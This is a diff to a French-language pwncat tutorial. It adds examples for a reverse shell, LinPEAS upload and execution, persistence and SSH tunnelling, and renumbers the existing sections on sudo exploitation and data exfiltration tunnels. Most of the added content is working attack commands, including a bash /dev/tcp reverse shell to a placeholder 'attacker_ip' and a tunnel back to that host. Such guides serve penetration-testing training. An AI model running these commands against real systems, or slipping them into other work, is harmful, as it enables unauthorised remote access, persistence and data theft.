@@ -283,7 +283,56 @@ Pwncat inclut des modules pour automatiser l'identification des vulnérabilités
 
 ***
 
-#### Exemple 1 : Uploader un Script d'Exploitation et Maintenir une Session
+#### Exemple 1 : Reverse Shell avec Pwncat
+
+1.  **Configurer Pwncat en écoute sur un port** :
+
+    ```bash
+    pwncat -lp 4444
+    ```
+2.  **Établir la connexion depuis la cible** :
+
+    ```bash
+    bash -c 'bash -i >& /dev/tcp/attacker_ip/4444 0>&1'
+    ```
+3.  **Obtenir un Shell Interactif sur la cible** :
+
+    ```bash
+    run shell.interactive
+    ```
+
+***
+
+#### Exemple 2 : Uploader et Exécuter un Script de Post-Exploitation
+
+1.  **Uploader un script LinPEAS** :
+
+    ```bash
+    run shell.upload src="/path/to/linpeas.sh" dest="/tmp/linpeas.sh"
+    ```
+2.  **Exécuter le script** :
+
+    ```bash
+    run shell.interactive
+    bash /tmp/linpeas.sh
+    ```
+
+***
+
+#### Exemple 3 : Persistance et Tunnels
+
+1.  **Configurer une session persistante** :
+
+    ```bash
+    pwncat --persist
+    ```
+2.  **Mettre en place un tunnel SSH pour la communication** :
+
+    ```bash
+    run network.ssh_tunnel remote_host=attacker_ip remote_port=22 local_port=8080
+    ```
+
+#### Exemple 4 : Uploader un Script d'Exploitation et Maintenir une Session
 
 1.  **Uploader un script LinPEAS** :
 
@@ -304,7 +353,7 @@ Pwncat inclut des modules pour automatiser l'identification des vulnérabilités
 
 ***
 
-#### Exemple 2 : Exploiter une Vulnérabilité Sudo
+#### Exemple 5 : Exploiter une Vulnérabilité Sudo
 
 1.  **Rechercher les vulnérabilités Sudo** :
 
@@ -319,7 +368,7 @@ Pwncat inclut des modules pour automatiser l'identification des vulnérabilités
 
 ***
 
-#### Exemple 3 : Configurer un Tunnel pour Exfiltration de Données
+#### Exemple 6 : Configurer un Tunnel pour Exfiltration de Données
 
 1.  **Démarrer un tunnel SSH sécurisé** :
 
